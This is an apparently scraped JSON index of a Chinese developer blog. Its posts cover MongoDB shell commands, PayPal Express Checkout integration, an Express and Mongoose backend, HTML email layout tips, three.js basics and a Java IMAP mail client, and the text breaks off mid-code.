sort可以多查询出的文档记录进行排序,1代表升序，-1代表降序。 123db.myCol.find().sort(&#123;&#x27;_id&#x27;: 1&#125;)db.myCol.find().sort(&#123;&#x27;_id&#x27;: -1&#125;)","categories":[],"tags":[{"name":"Mongo DB","slug":"Mongo-DB","permalink":"https://blog.zhengxiangling.com/tags/Mongo-DB/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.zhengxiangling.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"author":"Elijah Zheng"},{"title":"MongoDB 学习","slug":"MongoDB-学习","date":"2018-01-29T06:59:00.000Z","updated":"2023-11-17T14:27:30.003Z","comments":true,"path":"2018/01/29/MongoDB-学习/","link":"","permalink":"https://blog.zhengxiangling.com/2018/01/29/MongoDB-%E5%AD%A6%E4%B9%A0/","excerpt":"1.进入数据库 1$ mongo 不进行任何操作的时候，默认使用的数据库为test 2.创建或切换数据库 12&gt; use learndbswitched to db learndb","text":"1.进入数据库 1$ mongo 不进行任何操作的时候，默认使用的数据库为test 2.创建或切换数据库 12&gt; use learndbswitched to db learndb 3.查看存在的数据库（只显示有数据的数据库） 12345&gt; show databases or&gt; show dbsadmin 0.000GBconfig 0.000GB 当向数据库learndb中插入数据时，show dbs才会显示learndb。 4.查看当前使用的数据库 12&gt; dblearndb 5.删除当前的数据库 12db.dropDatabase()&#123; &quot;ok&quot; : 1 &#125; 6.创建数据库集合 12&gt; db.createCollection(&#x27;myCol&#x27;)&#123; &quot;ok&quot; : 1 &#125; 创建时可以带参数options options参数是可选的，因此只需要指定集合的名称。 以下是可以使用的选项列表： 字段 类型 描述 capped Boolean (可选)如果为true，则启用封闭的集合。上限集合是固定大小的集合，它在达到其最大大小时自动覆盖其最旧的条目。 如果指定true，则还需要指定size参数。 autoIndexId Boolean (可选)如果为true，则在_id字段上自动创建索引。默认值为false。 size 数字 (可选)指定上限集合的最大大小(以字节为单位)。 如果capped为true，那么还需要指定此字段的值。 max 数字 (可选)指定上限集合中允许的最大文档数。 例如： 12345&gt; db.createCollection(&quot;myCol2&quot;, &#123;capped : true, autoIndexId : true, size : 6142800, max : 10000 &#125;)&#123; &quot;note&quot; : &quot;the autoIndexId option is deprecated and will be removed in a future release&quot;, &quot;ok&quot; : 1&#125; 7.查看创建的集合 123&gt; show collectionsmyColmyCol2 8.删除指定的集合 db.collection.drop() 12&gt; db.myCol2.drop()true 9.插入文档 db.collection.insert(&#123;&#125;) 123456&gt; db.myCol.insert(&#123; title: &#x27;learn mongodb&#x27;, url: &#x27;https://blog.zhengxiangling.com&#x27;, view: &#x27;99&#x27;&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;) 其他插入方法 db.post.save(document) db.collection.insertOne() db.collection.insertMany() 10.查询集合 db.collection.find() 12&gt; db.myCol.find()&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot; &#125; 结合preey()方法，格式化输出 1234567&gt; db.myCol.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot;&#125; 加参数的查找 操作 语法 示例 RDBMS等效语句 相等 &#123;&lt;key&gt;:&lt;value&gt;&#125; db.mycol.find(&#123;&quot;by&quot;:&quot;yiibai&quot;&#125;).pretty() where by = &#39;yiibai&#39; 小于 &#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$lt:50&#125;&#125;).pretty() where likes &lt; 50 小于等于 &#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$lte:50&#125;&#125;).pretty() where likes &lt;= 50 大于 &#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$gt:50&#125;&#125;).pretty() where likes &gt; 50 大于等于 &#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$gte:50&#125;&#125;).pretty() where likes &gt;= 50 不等于 &#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125; db.mycol.find(&#123;&quot;likes&quot;:&#123;$ne:50&#125;&#125;).pretty() where likes != 50 结合and或者or查找 123456789101112131415&gt;db.mycol.find( &#123; $and: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty()&gt;db.mycol.find( &#123; $or: [ &#123;key1: value1&#125;, &#123;key2:value2&#125; ] &#125;).pretty() 设置查找到的文档要显示出的字段，如只显示_id和title，1表示显示 1db.mycol.find(&#123;&#125;, &#123;&#x27;_id&#x27;:1, &#x27;title&#x27;:1&#125;) 11.更新文档 update 12&gt; db.myCol.update(&#123;title: &#x27;learn mongodb&#x27;&#125;, &#123;$set: &#123;title: &#x27;update title&#x27;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;) 默认只会修改匹配到的第一个文档，若要修改所有匹配到的文档，将参数multi设置为true 1&gt; db.myCol.update(&#123;title: &#x27;learn mongodb&#x27;&#125;, &#123;$set: &#123;title: &#x27;update title&#x27;&#125;, &#123;multi: true&#125;&#125;) 12.删除文档 remove 删除匹配到的所有文档 1db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;) 如果想只删除匹配到的第一条文档，加参数1 1db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;, 1) 把集合下的所有文档都删除 1db.myCol.remove() 13.限制记录数 limit(),skip() 比如查询到的记录有10条，只想要前5条，可以用limit() 1db.myCol.find().limit(5) 比如查询出的数据，不想要前3条，可以调过前三条的文档，可以用skip() 1db.myCol.find().skip(3) 14.排序记录 sort可以多查询出的文档记录进行排序,1代表升序，-1代表降序。 123db.myCol.find().sort(&#123;&#x27;_id&#x27;: 1&#125;)db.myCol.find().sort(&#123;&#x27;_id&#x27;: -1&#125;)","categories":[],"tags":[{"name":"Mongo DB","slug":"Mongo-DB","permalink":"https://blog.zhengxiangling.com/tags/Mongo-DB/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.zhengxiangling.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"author":"Elijah Zheng"},{"title":"web站点接入PayPal支付","slug":"web站点接入PayPal支付","date":"2018-01-25T10:38:00.000Z","updated":"2023-11-17T14:27:30.008Z","comments":true,"path":"2018/01/25/web站点接入PayPal支付/","link":"","permalink":"https://blog.zhengxiangling.com/2018/01/25/web%E7%AB%99%E7%82%B9%E6%8E%A5%E5%85%A5PayPal%E6%94%AF%E4%BB%98/","excerpt":"官方教程：PayPal Express Checkout 根据官方教程整理了一下具体步骤。","text":"官方教程：PayPal Express Checkout 根据官方教程整理了一下具体步骤。 模板： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;script src=&quot;https://www.paypalobjects.com/api/checkout.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;paypal-button&quot;&gt;&lt;/div&gt; &lt;script&gt; paypal.Button.render(&#123; locale: &#x27;zh_CN&#x27;, // or en_US env: &#x27;production&#x27;, // or sandbox commit: true, // Show a &#x27;Pay Now&#x27; button client: &#123; sandbox: &#x27;***&#x27;, production: &#x27;***&#x27; &#125;, style: &#123; size: &#x27;small&#x27;, color: &#x27;silver&#x27;, shape: &#x27;pill&#x27;, label: &#x27;checkout&#x27;, tagline: false &#125;, payment: function(data, actions) &#123; return actions.payment.create(&#123; payment: &#123; transactions: [ &#123; amount: &#123; total: &#x27;填入金额&#x27;, currency: &#x27;USD&#x27; &#125; &#125; ] &#125; &#125;); &#125;, onAuthorize: function(data, actions) &#123; return actions.payment.execute().then(function(payment) &#123; $.ajax(&#123; type: &#x27;POST&#x27;, url: &#x27;/&#x27;, data: &#123;&#125; &#125;).done(function (data) &#123; if (data == &#x27;0&#x27;) &#123; alert(&#x27;The payment is complete!&#x27;); window.location.reload(); &#125;else &#123; alert(&#x27;pay fail&#x27;) &#125; &#125;) &#125;); &#125;, onCancel: function(data, actions) &#123; /* * Buyer cancelled the payment */ &#125;, onError: function(err) &#123; /* * An error occurred during the transaction */ &#125; &#125;, &#x27;#paypal-button&#x27;); &lt;/script&gt;&lt;/body&gt; 1. 必须 js1&lt;script src=&quot;https://www.paypalobjects.com/api/checkout.js&quot;&gt;&lt;/script&gt; 2. 支付按钮&lt;div id=&quot;paypal-button&quot;&gt;&lt;/div&gt;，paypal.Button.render绑定对应的id(也可以是class)。 3. render 参数1)env： 运行环境 有两种： 类型 说明 sandbox 沙盒，用于测试，用添加的sandbox账号测试能否交易成功 production 生产环境，部署上线时使用的环境 2)locale： 语言版本 配套有多国语言，中文选用 zh_CN，美式英文选用 en_US 3）client： 客户端id 获取方式：登录 -&gt; Applications -&gt; 选择 REST API apps -&gt; create App 创建成功后，可以从创建的应用获取Sandbox 和 Live 的 client ID，填入 1234client: &#123; sandbox: &#x27;&#x27;, production: &#x27;&#x27;&#125;, 4)style： 定义支付按钮样式，参考 Customize Checkout Button 5)触发函数： 函数 说明 payment 点击支付时触发，total填入需要支付的金额，currency填入支付的货币类型 onAuthorize 支付成功时触发，当支付成功时可以用Ajax提交数据修改订单支付状态为已支付。 onCancel 当用户关闭支付页面时触发 onError 当支付出错时触发 4. 创建沙盒账号用于测试Sandbox accounts创建两个账号，BUSSINESS 以及 PERSONAL。创建完成后登录沙盒账号测试是否登录成功（红线按钮登录） 5. 使用sandbox 账号测试支付当env环境为sandbox时，点击支付按钮时，使用PERSONAL账号来登录支付（测试账号默认有余额 $9999），当支付成功时会调用函数onAuthorize,可以弹窗alert(&#39;pay success&#39;)来测试是否支付成功。若成功，上线时将env转为production环境即可。","categories":[],"tags":[{"name":"PayPal","slug":"PayPal","permalink":"https://blog.zhengxiangling.com/tags/PayPal/"},{"name":"支付","slug":"支付","permalink":"https://blog.zhengxiangling.com/tags/%E6%94%AF%E4%BB%98/"}],"author":"Elijah Zheng"},{"title":"express 搭建后台","slug":"express-搭建后台","date":"2018-01-18T01:52:00.000Z","updated":"2023-11-17T14:27:30.004Z","comments":true,"path":"2018/01/18/express-搭建后台/","link":"","permalink":"https://blog.zhengxiangling.com/2018/01/18/express-%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0/","excerpt":"安装 express 1express sudo cnpm i express -g 安装 express 生成器 1cnpm install express-generator -g 安装 mongodb 数据库 12#macbrew install mongodb","text":"安装 express 1express sudo cnpm i express -g 安装 express 生成器 1cnpm install express-generator -g 安装 mongodb 数据库 12#macbrew install mongodb MongoDB 极简实践入门 启动mongodb 的方式 js12mongod —config /usr/local/etc/mongod.conf(登录权限需要自行设置) 下载 mongodb GUI 工具 Robo 3T 自行安装 安装 mongoose node.js异步环境下对mongodb进行便捷操作的对象模型工具 1cnpm install mongoose --save 创建一个名为server的应用 1express server 安装依赖 12cd servercnpm install 启动应用的方式 1234# Mac or Linux DEBUG=myapp npm start # Windows set DEBUG=myapp &amp; npm start 操作mongodb，增加数据库myapp及集合goods 12345# 增加数据库use myapp# 插入数据db.goods.insert(&#123;&#x27;name&#x27;: &#x27;apple&#x27;, &#x27;price&#x27;: &#x27;5&#x27;&#125;) 在server目录下创建文件夹，用于保存模型models如：创建一个goods模型 1234567891011goods.jslet mongoose = require(&#x27;mongoose&#x27;);let Schema = mongoose.Schema;let productSchema = new Schema(&#123; &#x27;name&#x27;: String, &#x27;price&#x27;: Number&#125;);module.exports = mongoose.model(&#x27;Good&#x27;, productSchema);// 会自动将Good与goods集合相匹配，或者可以用下面的方法指定需要匹配的集合//module.exports = mongoose.model(&#x27;Good&#x27;, productSchema, &#x27;goods&#x27;); 然后在router中查询goods的数据 1234567891011121314151617181920212223242526272829303132333435363738394041var express = require(&#x27;express&#x27;);var router = express.Router();var mongoose = require(&#x27;mongoose&#x27;);var Goods = require(&#x27;../models/goods&#x27;);//连接数据库// mongoose.connect(&#x27;mongodb://127.0.0.1:27017/myapp&#x27;);mongoose.connect(&#x27;mongodb://localhost/konggu&#x27;);mongoose.connection.on(&#x27;connected&#x27;, () =&gt; &#123; console.log(&#x27;MongoDB connected success.&#x27;)&#125;)mongoose.connection.on(&#x27;error&#x27;, () =&gt; &#123; console.log(&#x27;MongoDB connected fail.&#x27;)&#125;)mongoose.connection.on(&#x27;disconnected&#x27;, () =&gt; &#123; console.log(&#x27;MongoDB connected disconneted.&#x27;)&#125;)router.get(&#x27;/&#x27;, function(req, res, next) &#123; // res.send(&#x27;respond with a resource of goods&#x27;); Goods.find(&#123;&#125;, (err, doc) =&gt; &#123; if (err) &#123; res.json(&#123; status: &#x27;1&#x27;, mes: err.message &#125;) &#125; else &#123; res.json(&#123; status: &#x27;0&#x27;, msg: &#x27;success&#x27;, result: &#123; count: doc.length, list: doc &#125; &#125;) &#125; &#125;)&#125;);module.exports = router; chrome json格式化插件jsonview","categories":[],"tags":[{"name":"node","slug":"node","permalink":"https://blog.zhengxiangling.com/tags/node/"},{"name":"express","slug":"express","permalink":"https://blog.zhengxiangling.com/tags/express/"},{"name":"vue","slug":"vue","permalink":"https://blog.zhengxiangling.com/tags/vue/"}],"author":"Elijah Zheng"},{"title":"如何在邮件中写html","slug":"如何在邮件中写html","date":"2017-12-21T10:43:31.000Z","updated":"2023-11-17T14:27:30.009Z","comments":true,"path":"2017/12/21/如何在邮件中写html/","link":"","permalink":"https://blog.zhengxiangling.com/2017/12/21/%E5%A6%82%E4%BD%95%E5%9C%A8%E9%82%AE%E4%BB%B6%E4%B8%AD%E5%86%99html/","excerpt":"当我们需要在邮件中显示想要的自己定义的格式的时候，就需要在 email 中编写 html，以下将列举一些制作过程中个人的一些总结。","text":"当我们需要在邮件中显示想要的自己定义的格式的时候，就需要在 email 中编写 html，以下将列举一些制作过程中个人的一些总结。 1.Doctype 使用这个是为了兼容性，但是就意味着不能使用HTML5。 12345678910&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Google Email&lt;/title&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;&lt;/head&gt;&lt;/html&gt; 2.布局 全局使用table进行布局 123456789101112131415&lt;body style=&quot;margin:0;padding:0&quot;&gt; &lt;div&gt; &lt;table width=&quot;680&quot; align=&quot;center&quot;&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td width=&quot;680&quot;&gt; &lt;table&gt; &lt;tbody&gt;&lt;/tbody&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt;&lt;/body&gt; 3.样式写在标签里面，图片统一用外链引入 1&lt;img src=&quot;http://ou1bzq6p5.bkt.clouddn.com/icon_date@2x.png&quot; alt=&quot;date: &quot; style=&quot;width:35px;height:35px;vertical-align:middle&quot;&gt; 4.不同邮件服务商对邮件的支持程度不同，注意兼容性问题。 1)页面宽度请设定在600到800px（像素）以内，高度根据内容的需求调整高度。 2)html代码在15kb以内。 3)单张图片尺寸不要超过1728px,否则outlook显示不全。 4)邮件内容图文比例4:6，否则容易进入垃圾箱。 5)table标签上如果不需要边框和间距请加上 border&#x3D;”0” cellpadding&#x3D;”0” cellspacing&#x3D;”0” 6)文字行高line-height、元素间距要定义在块状元素上（p、td、h、li等）才能起作用。 7)尽量写行内样式。 8)不要使用背景图片或gif动态图。 9)尽量不要用float、position来写邮件效果。 10)邮件中的按钮尽量不要用图片，可写个一行一列的表格，里面放个a标签。可能发到客户邮箱未被允许加载图片。 11)img标签要给alt属性，再图片未加载的情况，这个提示的文字就会显示比较重要。 12)一定要给p标签和h系列标签指定一个margin和padding（也可全都设置margin:0;padding:0;），不然不同的邮箱收到的邮件，间距不一致。font-size、font-weight也要指定，不然显示也不一致。 13)英文、数字不折行显示的话，给包裹的td加上word-break:break-all。 14)Outlook会自动为table cell 添加1px border，请在邮件顶部的内联样式中加上 table td { border-collapse: collapse; } 5.当使用响应式布局时，参考地址Free Responsive Email Template 1响应式设计可使用@media 媒体查询语句或百分比布局。 2)移动设备邮件模板宽度建议480px。 3)模板通常是1－3列式布局，推荐1-2列式。","categories":[],"tags":[],"author":"Elijah Zheng"},{"title":"three.js 初识","slug":"three-js-初识","date":"2017-11-30T06:07:00.000Z","updated":"2023-11-17T14:27:30.006Z","comments":true,"path":"2017/11/30/three-js-初识/","link":"","permalink":"https://blog.zhengxiangling.com/2017/11/30/three-js-%E5%88%9D%E8%AF%86/","excerpt":"什么是threejs，很简单，你将它理解成three + js就可以了。three表示3D的意思，js表示javascript的意思。那么合起来，three.js就是使用javascript 来写3D程序的意思。","text":"什么是threejs，很简单，你将它理解成three + js就可以了。three表示3D的意思，js表示javascript的意思。那么合起来，three.js就是使用javascript 来写3D程序的意思。 在Three.js中，要渲染物体到网页中，我们需要3个组建：场景（scene）、相机（camera）和渲染器（renderer）。有了这三样东西，才能将物体渲染到网页中去。 创建这三要素的代码如下： 12345var scene = new THREE.Scene(); // 场景var camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);// 透视相机var renderer = new THREE.WebGLRenderer(); // 渲染器renderer.setSize(window.innerWidth, window.innerHeight); // 设置渲染器的大小为窗口的内宽度，也就是内容区的宽度document.body.appendChild(renderer.domElement); 场景是所有物体的容器，如果要显示一个苹果，就需要将苹果对象加入场景中。 相机，相机决定了场景中那个角度的景色会显示出来。相机就像人的眼睛一样，人站在不同位置，抬头或者低头都能够看到不同的景色。场景只有一种，但是相机却又很多种。 渲染器决定了渲染的结果应该画在页面的什么元素上面，并且以怎样的方式来绘制。 点 123var point1 = new THREE.Vector3();point1.set(4,8,9); 线 123456789101112var geometry = new THREE.Geometry();var material = new THREE.LineBasicMaterial( &#123; vertexColors: true &#125; );var color1 = new THREE.Color( 0x444444 ), color2 = new THREE.Color( 0xFF0000 );// 线的材质可以由2点的颜色决定var p1 = new THREE.Vector3( -100, 0, 100 );var p2 = new THREE.Vector3( 100, 0, -100 );geometry.vertices.push(p1);geometry.vertices.push(p2);geometry.colors.push( color1, color2 );var line = new THREE.Line( geometry, material, THREE.LinePieces );scene.add(line); 1var geometry = new THREE.Geometry(); 几何体里面有一个vertices变量，可以用来存放点。 12345678910111213141516171819LineBasicMaterial( parameters )Parameters是一个定义材质外观的对象，它包含多个属性来定义材质，这些属性是：Color：线条的颜色，用16进制来表示，默认的颜色是白色。Linewidth：线条的宽度，默认时候1个单位宽度。Linecap：线条两端的外观，默认是圆角端点，当线条较粗的时候才看得出效果，如果线条很细，那么你几乎看不出效果了。Linejoin：两个线条的连接点处的外观，默认是“round”，表示圆角。VertexColors：定义线条材质是否使用顶点颜色，这是一个boolean值。意思是，线条各部分的颜色会根据顶点的颜色来进行插值。（如果关于插值不是很明白，可以QQ问我，QQ在前言中你一定能够找到，嘿嘿，虽然没有明确写出）。Fog：定义材质的颜色是否受全局雾效的影响。好了，介绍完这些参数，你可以试一试了，在课后，我们会展示不同同学的杰出作品。下面，接着上面的讲，我们这里使用了顶点颜色vertexColors: THREE.VertexColors，就是线条的颜色会根据顶点来计算。var material = new THREE.LineBasicMaterial( &#123; vertexColors: THREE.VertexColors &#125; ); 改变视角，让画面动起来 123456function animation () &#123; // renderer.clear() camera.position.x = camera.position.x + 1 renderer.render(scene, camera) requestAnimationFrame(animation)&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/*** 场景（scene） ***/var scene = new THREE.Scene(); // 创建场景scene.add(x); // 插入场景/*** 相机（camera） ***/// 正交投影相机var camera = new THREE.OrthographicCamera(left, right, top, bottom, near, far);// 透视头像相机var camera = new THREE.PerspectiveCamera(fov, aspect, near, far); // fov：人眼夹角，aspect：长宽比/*** 渲染器（renderer） ***/var renderer = new THREE.WebGLRenderer(options);// options &#123;&#125; 可选。参数：// canvas：element &lt;canvas&gt;&lt;/canvas&gt;renderer.setSize(长, 宽);element.appendChild(renderer.domElement); // 插入节点renderer.setClearColor(color, opacity); // 设置清除后的颜色 16进制renderer.clear(); // 清除面板renderer.render(scene, camera); // 渲染/*** 光照(light) ***/new THREE.AmbientLight(颜色); // 环境光new THREE.PointLight(颜色, 强度, 距离); // 点光源new THREE.DirectionalLight(颜色, 亮度); // 平行光new THREE.SpotLight(颜色, 强度, 距离, 夹角, 衰减指数); // 聚光灯/*** 几何形状 ***/new THREE.CubeGeometry(长, 宽, 高, 长的分割, 宽的分割, 高的分割); // 立方体new THREE.PlanGeometry(长,宽, 长的分割, 宽的分割); // 平面new THREE.SphereGeometry(半径, 经度切片, 纬度分割, 经度分割, 经度跨过, 纬度开始, 纬度跨过); // 球体new THREE.CircleGeometry(半径, 切片数, 开始, 跨过角度); // 圆形new THREE.CylinderGeometry(顶部面积, 底部面积, 高, 圆分割, 高分割, 是否没有顶面和底面); // 圆台new THREE.TetrahedronGeometry(半径, 细节); // 正四边形new THREE.OctahedronGeometry(半径, 细节); // 正八边形new THREE.IconsahedronGeometry(半径, 细节); // 正十二边形new THREE.TorusGeometry(半径, 管道半径, 纬度分割, 经度分割, 圆环面的弧度); // 圆环面// 自定义形状var geometry = new THREE.Geometry();geometry.vertices.push(new THREE.Vectory3(x, y, z)); // 点，其中x、y、z为坐标geometry.faces.push(new THREE.Faces3(x, y, z)); // 面，其中x、y、z为点的数组的索引，三点确定一个面/*** 材质 ***/new THREE.MeshBasicMaterial(options); // 基本材质// options &#123;&#125; 可选。参数：// visible：是否可见// color：颜色// wireframe: 是否渲染线而非面// side：THREE.FrontSide 正面，THREE.BackSide 反面，THREE.DoubleSide 双面// map: 贴图new THREE.MeshLambertMaterial(options); // Lambert材质，适合光照// ambient：反射能力// emissive：自发光颜色new THREE.MeshPhongMaterial(); // Phong材质，适合金属和镜面// specular：光罩颜色// shininess：光斑大小（值越大，光斑越小）new THREE.MeshNormalMaterial(); // 方向材质/* 贴图 */var texture = THREE.ImageUtils.loadTexture(url, &#123;&#125;, function()&#123;&#125;); // 载入单个贴图（建议贴图的长宽为256的倍数）new THREE.MeshFaceMaterial() // 设置不同面的贴图，参数为单个贴图的数组texture.wrapS texture.wrapT = THREE.RepeatWrapping // 贴图的重复方式texture.repeat.set(x, y) // 重复次数new THREE.texture(canvas) // 将canvas作为贴图/*** 将模型和贴图结合 ***/var mesh = new THREE.Mesh(形状, 材质);mesh.position // 位置 mesh.position.x（y、z） 或 mesh.position.set(x, y, z)mesh.scale // 缩放mesh.rotation // 旋转/*** 监视FPS ***/var stats = new Stats();stats.domElement // 节点stats.begin() // 开始stats.end() // 结束","categories":[],"tags":[{"name":"three","slug":"three","permalink":"https://blog.zhengxiangling.com/tags/three/"},{"name":"图形学","slug":"图形学","permalink":"https://blog.zhengxiangling.com/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"}],"author":"Elijah Zheng"},{"title":"电子邮件的实现之IMAP（Java版）","slug":"电子邮件的实现之IMAP（Java版）","date":"2017-11-25T03:05:00.000Z","updated":"2023-11-17T14:27:30.011Z","comments":true,"path":"2017/11/25/电子邮件的实现之IMAP（Java版）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8BIMAP%EF%BC%88Java%E7%89%88%EF%BC%89/","excerpt":"IMAP（Internet Mail Access Protocol，Internet邮件访问协议）以前称作交互邮件访问协议（Interactive Mail Access Protocol）。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端（例如MS Outlook Express)可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP&#x2F;IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。","text":"IMAP（Internet Mail Access Protocol，Internet邮件访问协议）以前称作交互邮件访问协议（Interactive Mail Access Protocol）。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端（例如MS Outlook Express)可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP&#x2F;IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。 与POP3协议类似，IMAP（Internet消息访问协议）也是提供面向用户的邮件收取服务。常用的版本是IMAP4。IMAP4改进了POP3的不足，用户可以通过浏览信件头来决定是否收取、删除和检索邮件的特定部分，还可以在服务器上创建或更改文件夹或邮箱。它除了支持POP3协议的脱机操作模式外，还支持联机操作和断连接操作。它为用户提供了有选择的从邮件服务器接收邮件的功能、基于服务器的信息处理功能和共享信箱功能。IMAP4的脱机模式不同于POP3，它不会自动删除在邮件服务器上已取出的邮件，其联机模式和断连接模式也是将邮件服务器作为“远程文件服务器”进行访问，更加灵活方便。IMAP4支持多个邮箱。IMAP4的这些特性非常适合在不同的计算机或终端之间操作邮件的用户（例如你可以在手机、PAD、PC上的邮件代理程序操作同一个邮箱），以及那些同时使用多个邮箱的用户。 各参数返回的邮件信息： 参数 代表信息 ALL 只返回按照一定格式的邮件摘要，包括邮件标志、RFC822.SIZE、自身的时间和信封信息。IMAP客户机能够将标准邮件解析成这些信息并显示出来。 BODY 只返回邮件体文本格式和大小的摘要信息。IMAP客户机可以识别这些细腻，并向用户显示详细的关于邮件的信息。其实是一些非扩展的BODYSTRUCTURE的信息。 FAST 只返回邮件的一些摘要，包括邮件标志、RFC822.SIZE、和自身的时间。 FULL 同样的还是一些摘要信息，包括邮件标志、RFC822.SIZE、自身的时间和BODYSTRUCTURE的信息。 BODYSTRUCTUR 是邮件的[MIME-IMB]的体结构。这是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段和[MIME-IMB]头信息得出来 的。包括的内容有：邮件正文的类型、字符集、编码方式等和各附件的类型、字符集、编码方式、文件名称等等。 ENVELOPE 信息的信封结构。是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段得出来的，默认各字段都是需要的。主要包括：自身的时间、附件数、收件人、发件人等。 FLAGS 此邮件的标志。 INTERNALDATE 自身的时间。 RFC822.SIZE 邮件的[RFC-2822]大小 RFC822.HEADER 在功能上等同于BODY.PEEK[HEADER]， RFC822 功能上等同于BODY[]。 RFC822.TEXT 功能上等同于BODY[TEXT] UID 返回邮件的UID号，UID号是唯一标识邮件的一个号码。 BODY[section] &lt;&lt;partial&gt;&gt; 返回邮件的中的某一指定部分，返回的部分用section来表示，section部分包含的信息通常是 代表某一部分的一个数字或者是下面的某一个部分：HEADER, HEADER.FIELDS, HEADER.FIELDS.NOT, MIME, and TEXT。如果section部分是空的话，那就代表返回全部的信息，包括头信息。 BODY[HEADER] 返回完整的文件头信息。 BODY[HEADER.FIELDS ()] 在小括号里面可以指定返回的特定字段。 BODY[HEADER.FIELDS.NOT ()] 在小括号里面可以指定不需要返回的特定字段。 BODY[MIME] 返回邮件的[MIME-IMB]的头信息，在正常情况下跟BODY[HEADER]没有区别。 BODY[TEXT] 返回整个邮件体，这里的邮件体并不包括邮件头。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package IMAP;import java.util.Properties;import javax.mail.Folder;import javax.mail.Message;import javax.mail.Session;import javax.mail.Store;import javax.mail.internet.MimeMessage;import javax.mail.internet.MimeUtility;import POP3.POP3;import com.sun.mail.imap.IMAPMessage;public class IMAP &#123; public static void main(String[] args) throws Exception &#123; // 准备连接服务器的会话信息 Properties props = new Properties(); props.setProperty(&quot;mail.store.protocol&quot;, &quot;imap&quot;); props.setProperty(&quot;mail.imap.host&quot;, &quot;imap.sina.cn&quot;); props.setProperty(&quot;mail.imap.port&quot;, &quot;143&quot;); // 创建Session实例对象 Session session = Session.getInstance(props); // 创建IMAP协议的Store对象 Store store = session.getStore(&quot;imap&quot;); // 连接邮件服务器 store.connect(&quot;your_name@sina.cn&quot;, &quot;your_password&quot;); // 获得收件箱 Folder folder = store.getFolder(&quot;INBOX&quot;); // 以读写模式打开收件箱 folder.open(Folder.READ_WRITE); // 获得收件箱的邮件列表 Message[] messages = folder.getMessages(); // 打印不同状态的邮件数量 System.out.println(&quot;收件箱中共&quot; + messages.length + &quot;封邮件!&quot;); System.out.println(&quot;收件箱中共&quot; + folder.getUnreadMessageCount() + &quot;封未读邮件!&quot;); System.out.println(&quot;收件箱中共&quot; + folder.getNewMessageCount() + &quot;封新邮件!&quot;); System.out.println(&quot;收件箱中共&quot; + folder.getDeletedMessageCount() + &quot;封已删除邮件!&quot;); System.out .println(&quot;------------------------开始解析邮件----------------------------------&quot;); // 解析邮件 for (int i = 0, count = 2; i &lt; count; i++) &#123; MimeMessage msg = (MimeMessage) messages[i]; String subject = MimeUtility.decodeText(msg.getSubject()); 